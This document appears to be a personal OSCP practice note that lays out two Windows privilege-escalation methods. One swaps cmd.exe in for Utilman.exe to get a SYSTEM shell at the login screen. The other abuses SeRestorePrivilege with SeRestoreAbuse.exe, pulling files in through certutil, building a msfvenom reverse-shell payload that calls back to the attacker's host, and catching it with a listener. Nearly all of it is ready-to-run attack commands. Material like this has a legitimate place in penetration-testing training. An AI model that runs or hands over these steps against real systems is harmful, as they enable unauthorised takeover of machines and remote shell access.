## Method 1

```
cd C:\Windows\system32
```

```  
ren Utilman.exe Utilman.old
```

```  
ren cmd.exe Utilman.exe
```

---
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `rdesktop ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260817200704.png]]

Then press WinKey + U 

![[Pasted image 20260817200717.png]]

Root shell

---
## Method 2

Host server for [SeRestoreAbuse.exe](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

Transfer into VICTIM HOST
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/SeRestoreAbuse.exe SeRestoreAbuse.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

reverse.exe | Port 4444 | x64
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";const machine = page?.MACHINE ?? "NO MACHINE FOUND"

const command = `cd ~/Desktop/PGPlay/${machine} && msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=4444 -f exe -o reverse.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Host server for shell.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";const machine = page?.MACHINE ?? "NO MACHINE FOUND"

const command = `cd ~/Desktop/PGPlay/${machine} && python -m http.server 80`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/reverse.exe reverse.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Prepare listener
```
cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
```

Run SeRestoreAbuse.exe
```powershell
.\SeRestoreAbuse.exe [pathtoreverse.exe]
```